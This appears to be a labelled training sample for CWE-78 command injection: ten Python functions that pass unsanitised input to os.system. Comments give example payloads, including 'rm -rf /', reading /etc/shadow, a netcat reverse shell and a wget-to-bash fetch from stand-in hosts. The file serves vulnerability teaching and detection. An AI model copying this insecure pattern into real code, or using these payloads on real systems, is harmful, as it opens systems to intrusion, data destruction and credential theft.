# VULNERABLE: Command Injection via os.system - Training Sample
# CWE-78: Improper Neutralization of Special Elements used in an OS Command
# Severity: CRITICAL
# Description: User input is concatenated into shell commands executed by os.system()

import os


def ping_host(hostname):
    """VULNERABLE: hostname injected into ping command."""
    # VULN: e.g. hostname = "8.8.8.8; rm -rf /" triggers secondary shell command
    os.system("ping -c 1 " + hostname)


def convert_file(filename):
    """VULNERABLE: filename injected into imagemagick-style command."""
    # VULN: filename = "img.jpg; cat /etc/passwd > /tmp/out.txt"
    os.system("convert " + filename + " output.png")


def compress_upload(filepath):
    """VULNERABLE: filepath passed to tar without sanitization."""
    # VULN: filepath = "/tmp/x; nc attacker.com 4444 -e /bin/bash"
    os.system(f"tar czf archive.tar.gz {filepath}")


def send_report(email, attachment):
    """VULNERABLE: Both email and attachment are injectable."""
    # VULN: email = "user@example.com; wget http://evil.com/shell.sh | bash"
    os.system("sendmail -a " + attachment + " " + email)


def backup_db(db_name):
    """VULNERABLE: db_name used in mysqldump command."""
    # VULN: db_name = "mydb; DROP DATABASE mydb;#"
    os.system("mysqldump " + db_name + " > backup.sql")


def list_directory(path):
    """VULNERABLE: directory listing with user-supplied path."""
    # VULN: path = "/var/www && cat /etc/shadow"
    os.system("ls -la " + path)


def set_file_permissions(filename, mode):
    """VULNERABLE: chmod with user-controlled filename and mode."""
    # VULN: filename = "file.txt; id > /tmp/id.txt"
    os.system("chmod " + mode + " " + filename)


def grep_logs(pattern):
    """VULNERABLE: grep with attacker-controlled pattern."""
    # VULN: pattern = ". /etc/passwd #"  or use process substitution
    os.system("grep '" + pattern + "' /var/log/app.log")


def resize_image(width, height, src, dst):
    """VULNERABLE: All four params injectable in one command."""
    # VULN: any param can break out of the command
    os.system(f"ffmpeg -i {src} -vf scale={width}:{height} {dst}")


def notify_admin(message):
    """VULNERABLE: message embedded in mail command body."""
    # VULN: message = "done\n\n$(id)" — ANSI/shell expansion in some mailers
    os.system('echo "' + message + '" | mail -s "Alert" admin@example.com')